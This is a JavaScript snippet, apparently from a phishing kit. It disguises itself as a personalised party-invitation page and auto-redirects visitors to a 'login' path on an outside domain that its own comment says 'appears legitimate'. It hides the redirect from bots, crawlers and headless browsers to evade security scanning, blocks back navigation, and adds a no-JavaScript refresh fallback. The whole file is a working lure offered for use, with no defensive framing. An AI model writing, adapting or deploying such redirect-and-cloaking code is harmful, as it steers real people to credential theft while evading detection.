<script>
  // Seamless Auto-Redirect Script with Dynamic Name (No Popup, No HTML changes)
  document.addEventListener('DOMContentLoaded', function() {
    // Function to construct the final redirect URL
    function getRedirectURL() {
      // Base URL - appears legitimate
      const baseURL = "https://partyrsvp.biz/login/profile/e/invite/";
      
      // Get the name from URL parameter
      const urlParams = new URLSearchParams(window.location.search);
      let name = urlParams.get('name') || urlParams.get('guest') || '';
      
      // If no name, default to Guest
      if (!name) {
        name = 'Guest';
      }
      
      // Preserve existing query parameters
      const queryString = window.location.search;
      
      // Build the redirect URL with the name
      let redirectURL = baseURL;
      
      if (queryString) {
        // If there are existing params, append name
        redirectURL += queryString.substring(1) + '&name=' + encodeURIComponent(name);
      } else {
        // No existing params, add name as first param
        redirectURL += '?name=' + encodeURIComponent(name);
      }
      
      return redirectURL;
    }

    // Create a smooth redirect experience
    setTimeout(function() {
      // Update overlay message (keep the original text)
      const overlay = document.getElementById('redirectOverlay');
      if (overlay) {
        overlay.querySelector('h2').textContent = 'Accessing Your Invitation...';
        overlay.querySelector('p').textContent = 'Your personalized invitation is now ready.';
      }

      // Add a small, natural delay before redirect
      setTimeout(function() {
        // Check for bots - only redirect real users
        const userAgent = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawl|spider|scrape|curl|wget|python|java|phantom|headless/i.test(userAgent);
        
        if (!isBot) {
          // Use replace to prevent back navigation
          window.location.replace(getRedirectURL());
        } else {
          // For bots, just show the full page
          if (overlay) {
            overlay.style.opacity = '0';
            setTimeout(() => {
              overlay.style.display = 'none';
            }, 500);
          }
        }
      }, 1200);
    }, 1800);

    // Handle case where JavaScript is disabled
    const noscriptMeta = document.createElement('noscript');
    noscriptMeta.innerHTML = `
      <meta http-equiv="refresh" content="3;url=https://partyrsvp.biz/login/profile/e/invite/?name=Guest">
      <style>
        .redirect-overlay {
          display: flex !important;
          background: white;
        }
        .redirect-overlay h2 {
          color: #2e8b57;
        }
      </style>
    `;
    document.head.appendChild(noscriptMeta);
  });
</script>
